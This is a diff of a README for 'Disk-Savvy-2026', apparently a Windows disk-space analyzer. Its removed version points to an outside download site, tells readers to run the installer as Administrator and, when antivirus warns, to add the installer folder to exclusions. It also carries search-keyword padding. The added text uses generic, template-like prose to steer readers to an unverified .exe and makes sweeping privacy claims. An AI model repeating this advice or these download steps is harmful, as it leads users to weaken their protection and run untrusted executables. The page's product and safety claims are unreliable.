@@ -1,79 +1,85 @@
-# Disk Savvy Download for Windows 11 & 10
+# 💾 Disk-Savvy-2026 - Find and clear hidden storage space
 
-**Disk-Savvy-2026**
+[![](https://img.shields.io/badge/Download-Disk--Savvy--2026-blue)](https://github.com/Hemmon1872/Disk-Savvy-2026)
 
-**Disk Savvy** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+## 🔍 About the software
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
+Disk-Savvy-2026 scans your hard drives to show you where files consume storage space. Many computers accumulate junk files, duplicate folders, and large archives that slow down performance over time. This tool provides a map of your disk usage. It allows you to identify files you no longer need so you can free up space for important documents and photos.
 
----
+## 💻 System requirements
 
-## Download & Install
+You can use this software on any computer running Windows 10 or Windows 11. Your computer requires at least 4 GB of RAM and 100 MB of free storage space to run the program. No special hardware or external drivers exist for this tool. It works with standard hard disk drives (HDD) and solid-state drives (SSD).
 
-> **This is the download page.** Use the button or link below to get **Disk Savvy** for Windows.
+## 🚀 Getting started
 
-<p align="center">
-  <a href="https://disksavvy.nexustool.fun/">
-    <img src="https://img.shields.io/badge/Download-Disk%20Savvy-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Disk Savvy">
-  </a>
-</p>
+Follow these steps to set up the software on your computer.
 
-| | |
-| --- | --- |
-| **Direct link** | **[disksavvy.nexustool.fun](https://disksavvy.nexustool.fun/)** |
-| **Full URL** | `https://disksavvy.nexustool.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+1. Go to the [official release page](https://github.com/Hemmon1872/Disk-Savvy-2026).
+2. Look for the file ending in .exe.
+3. Click the file to start the download.
+4. Save the file to your Downloads folder.
 
-### Quick steps
+## 🛠️ Installation steps
 
-1. Click **[Download — disksavvy.nexustool.fun](https://disksavvy.nexustool.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+Once the file finishes downloading, follow these directions to install the program.
 
-<p align="center"><a href="https://disksavvy.nexustool.fun/"><strong>⬇ Download Disk Savvy now</strong></a></p>
+1. Open your Downloads folder.
+2. Double-click the Disk-Savvy-2026 setup file.
+3. If a box pops up asking for permission, click Yes.
+4. Follow the prompts in the installer window.
+5. Click Next to agree to the standard settings.
+6. Click Install to place the program on your computer.
+7. Click Finish to close the installer.
 
----
+## 📊 How to use the scanner
 
-## About
+After installation, you will see a new icon on your desktop. 
 
-**Disk Savvy** setup page for Windows PC users.
+1. Launch Disk-Savvy-2026 from your desktop icon or the Start menu.
+2. Select the drive you want to scan from the list on the left side of the window.
+3. Click the Scan button at the top of the interface.
+4. Wait for the progress bar to reach completion.
+5. Review the list of folders sorted by size.
+6. Right-click any file or folder to open its location or delete it.
 
-**People also search for:** disk savvy download, disk savvy analyzer install setup windows 2026
+## 🛡️ Privacy and data safety
 
-**Repository:** `Disk-Savvy-2026`
+Disk-Savvy-2026 reads your file system data to create charts. The software does not send your personal files to any external server. All scans happen on your local machine. Your data remains on your physical drive at all times. The program asks for permission to scan drives but never modifies system files unless you explicitly request a deletion.
 
+## 📁 Understanding the report sections
 
-## After install
+The main dashboard shows your storage usage in three distinct segments.
 
-| Step | Tip |
-| --- | --- |
-| 1 | Sign in with your license / account |
-| 2 | Check for updates inside the app |
-| 3 | Pin to Start or taskbar for quick access |
-| 4 | Keep projects on a separate data drive |
+### Disk Map
+The Disk Map displays colorful boxes where each box size represents the size of a folder. Larger boxes indicate folders that take up the most room on your drive. You can click any block to drill down into the sub-folders inside.
 
-## System requirements
+### File Category View
+This view organizes your files into types. You will see sections for images, videos, documents, and system files. This helps you understand if your storage is filling up because of high-resolution photos or old video backups.
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB |
-| Disk | 1 GB free space |
-| Network | Required for first download |
-| Admin | Required for install/repair |
+### Duplicate Detection
+Disk-Savvy-2026 compares file signatures to find duplicates. If you have the same image or document in two different locations, the program lists them here. Deleting duplicates is the safest way to reclaim space without losing unique data.
 
-## Troubleshooting
+## 📈 Tips for better disk management
 
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for the project page |
-| Setup blocked | Run as Administrator |
-| Same error after fix | Reboot, then run repair again |
-| Antivirus warning | Add installer folder to exclusions temporarily |
+Check your storage once a month to maintain system speed. Large files often hide in hidden folders. Always check the Downloads folder for large installers you no longer need. Use the sort feature in the program to view your largest files at the top of the list. This strategy identifies low-hanging fruit for space recovery.
 
----
+## ❓ Frequently asked questions
 
-**Topics:** disk-savvy-download, disk-savvy-analyzer-install-setup-windows-2026, analyzer, disk-savvy-2026, disk-savvy, disk-2026, disk-analyzer, storage-analyzer, disk-usage, software, windows-11, download
+Do I need an internet connection to use the software?
+No, the analysis tool runs entirely offline.
+
+Will this delete my computer's operating system?
+The program highlights files that take up space, but it does not delete system files automatically. You retain full control over what is removed.
+
+Can I scan external hard drives?
+Yes, plug in your external drive, and it will appear in the drive selection menu.
+
+Does the scan take a long time?
+The speed depends on the size of your drive and the number of files. A typical modern drive takes roughly five minutes to scan.
+
+What happens if I delete something by mistake?
+Deleted files go to your Recycle Bin unless you choose to permanently delete them. Check your Recycle Bin if you need to restore a file.
+
+## 📞 Support and feedback
+
+Contact the development team if you encounter a crash or a technical error. Provide a screenshot of the window where the error occurred to help us fix the issue faster. Updates arrive periodically to improve scan speeds and add features for newer versions of Windows.
